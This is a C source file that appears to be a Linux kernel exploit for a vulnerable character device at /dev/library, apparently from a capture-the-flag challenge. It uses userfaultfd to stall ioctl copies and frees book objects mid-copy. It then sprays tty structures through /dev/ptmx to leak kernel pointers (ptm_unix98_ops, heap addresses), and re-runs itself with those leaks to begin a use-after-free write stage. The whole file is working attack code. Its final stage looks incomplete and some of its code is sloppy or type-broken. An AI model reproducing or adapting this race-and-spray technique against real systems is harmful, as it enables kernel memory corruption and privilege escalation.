#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>

#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>


#include "userfaultd.h"

#define DEV_PATH        "/dev/library"
#define EXP_MSG         "[...] "

#define PG_ADDR         0xdead000
#define W_PG_ADDR       0xcafe000

#define HEAP_OF         0x38
#define DESC_SZ         0x300
#define PAGE_SZ         0x1000
#define SPRAY_CNT       1

#define STATUS_OK       0
#define STATUS_BAD      -1

#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

int idx = 0;
int ufd;
int dev_fd;

void *DESC_BUF[DESC_SZ/sizeof(void *)];

int spray_fds[SPRAY_CNT];

typedef void (*f_t)();
typedef unsigned long ul;
typedef struct lib_request * slr;

struct lib_request {
    ul idx;
    void *ptr;
};

void open_device() {
    dev_fd = open(DEV_PATH, O_RDWR);
    if(dev_fd < 0) {
        puts(EXP_MSG "failed to open device");
        exit(-1);
    }
}

int task_ioctl(ul cmd, slr req) {
    return ioctl(dev_fd, cmd, req);
}


// kzalloc :/
int add_book(ul idx) {
    printf(EXP_MSG "Creating the book [%d]\n", idx);
    // kmalloc-1k
    slr lr =  (slr) malloc(sizeof(struct lib_request));
    lr->idx = idx;

    return task_ioctl(CMD_ADD, lr);
}

int remove_book(ul idx) {
    printf(EXP_MSG "Removing the book [%d]\n", idx);

    slr lr =  (slr) malloc(sizeof(struct lib_request));
    lr->idx = idx;

    return task_ioctl(CMD_REMOVE, lr);
}

int add_desc(ul idx, void *buf) {
    printf(EXP_MSG "Setthing the desc [%d]\n", idx);


    slr lr =  (slr) malloc(sizeof(struct lib_request));
    
    lr->idx = idx;
    lr->ptr = buf;

    return task_ioctl(CMD_ADD_DESC, lr);
}

int get_desc(ul idx, void *buf) {
    printf(EXP_MSG "Getting the desc [%d]\n", idx);


    slr lr =  (slr) malloc(sizeof(struct lib_request));
    
    lr->idx = idx;
    lr->ptr = buf;

    int c = task_ioctl(CMD_GET_DESC, lr);
    
    memcpy(DESC_BUF, buf, DESC_SZ);
    dump(DESC_BUF);
    return c;
}

int _get_desc(ul idx, void *addr) {
    return task_ioctl(CMD_GET_DESC, addr);
}

int remove_all() {
    slr lr =  (slr) malloc(sizeof(struct lib_request));
    lr->idx = 0;
    lr->ptr = NULL;

    puts("removing all");
    return task_ioctl(CMD_REMOVE_ALL, lr);
}

void panic(char *msg) {
    printf("[-] %s\n", msg);
    exit(-1);
}

int userfaultfd(int flags) {
    return syscall(SYS_userfaultfd, flags);
}


int uf_reg(void *page) {
    int fd, code;
    if((fd = userfaultfd(O_NONBLOCK)) < 0) {
        panic("failed to get fd (userfault)");
    }

    // Specify api version?
    struct uffdio_api api = {
        .api = UFFD_API,
    };

    if((code=ioctl(fd, UFFDIO_API, &api)) < 0) {
        panic("failed to perform UFFDIO_API ioctl");
    }

    if(api.api != UFFD_API) {
        panic("incorrect UFFD_API version");
    }

    // Register pages 
    struct uffdio_register req = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = page,
            .len = PAGE_SZ
        }
    };

    if((code = ioctl(fd, UFFDIO_REGISTER, &req)) < 0) {
        printf("CODE=%d\n", code);
        panic("failed to register ufaultfd");
    }

    return fd;
}

void spray() {
    puts(EXP_MSG "spraying on kmalloc-1k...");

    for(int i = 0; i < SPRAY_CNT; i += 1) {
        spray_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if(spray_fds[i] < 0) {
            panic("failed to open ptmx");
        }
    }
}

void uaf_hook_read() {
    puts(EXP_MSG "HOOK: doing dirty things [read]");

    // Spray for kmalloc-1k structs
    remove_all();
    spray();
}

void uaf_hook_write() {
    puts(EXP_MSG "HOOK: doing dirty things [write]");

    remove_all();
    spray();
}

void dump(void *buf[96]) {
    puts(EXP_MSG "dumping leaked content");
    for(int i = 0; i < 12; i += 2) {
        printf("[%d, %d] 0x%016llx 0x%016llx\n", i, i+1, buf[i], buf[i+1]);
    }

    // [2] k-192
    // [3] ptm_unix98_ops
    // [7] k-1k (BUT UNALIGNED. -0x38 offset)
    // [11]k-16
}

f_t curr_hook = uaf_hook_read; 

void _poll() {
    int r;

    char tmp[PAGE_SZ];

    puts(EXP_MSG "handling poll event");

    struct pollfd poll_req = {
        .fd = ufd,
        .events = POLLIN
    };

    while(poll(&poll_req, 1, -1) > 0) {
        if(poll_req.revents & POLLHUP || poll_req.revents & POLLERR) {
            panic("bad events on handler");
        }

        struct uffd_msg fault_msg = {0};
        if((r=read(ufd, &fault_msg, sizeof(fault_msg))) != sizeof(fault_msg)) {
            printf(EXP_MSG "ask %d got %d\n", sizeof(fault_msg), r);
            panic("failed to read event data");
        }
        
        if(fault_msg.event == UFFD_EVENT_PAGEFAULT) {
            void *failed_page = fault_msg.arg.pagefault.address;
            printf(EXP_MSG "Oh, got fault: address: %p\n", failed_page);
            
            if(failed_page == PG_ADDR || failed_page == W_PG_ADDR) {
                curr_hook();

                // Release the event 
                struct uffdio_copy copy = {
                    .dst = (long) failed_page,
                    .src = (long) tmp,
                    .len = PAGE_SZ,
                };
                
                if(ioctl(ufd, UFFDIO_COPY, &copy) < 0) {
                    panic("failed to release UFD event");
                }

                puts("released the event. Closing fd");
                close(ufd);
                return NULL;
            }
        }
    }
}


void *uf_handler(void *) {
    _poll();
}

void *mmap_page(void *addr) {
    return mmap(
        addr, 2*PAGE_SZ, PROT_READ|PROT_WRITE,
        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0
    );
}

int main(int argc, char **argv) {
    char t[DESC_SZ];
    pthread_t hdl_c;

    open_device();

    // Register userfault for abusing race conditions
    void *addr = mmap_page(PG_ADDR);
    ufd = uf_reg(PG_ADDR);
    printf(EXP_MSG "Registered the ufh(%d): %p\n", ufd, addr);

    // run handler in pthread
    pthread_create(&hdl_c, NULL, uf_handler, NULL);
    printf(EXP_MSG "started uf handler(%p)\n", hdl_c);

    if(argc == 1) {
        // Trigger UAF(r)
        if(add_book(idx) != 0) {
            panic("failed to allocate book");
        }

        if(get_desc(idx, PG_ADDR)) {
            panic("failed to get description");
        }

        char cmd_buf[256];
        sprintf(&cmd_buf, "%s %d %d\x00", argv[0], DESC_BUF[3], DESC_BUF[7]-0x38);

        system(cmd_buf);
    } else {
        // Setup crusher
        puts("-- Now I know everything --");
        
        void *base_opt = atoi(argv[1]);
        void *base_heap = atoi(argv[2]);

        printf(EXP_MSG "BASE=%p HEAP=%p\n", base_opt, base_heap);
        curr_hook = uaf_hook_write;
        
        if(add_book(idx) != 0) {
            panic("failed to allocate book");
        }

        memset(PG_ADDR, 'A', 0x1000);
        if(add_desc(idx, PG_ADDR)) {
            panic("failed to get description");
        }

        close(spray_fds[0]);
    }


    return 0;
}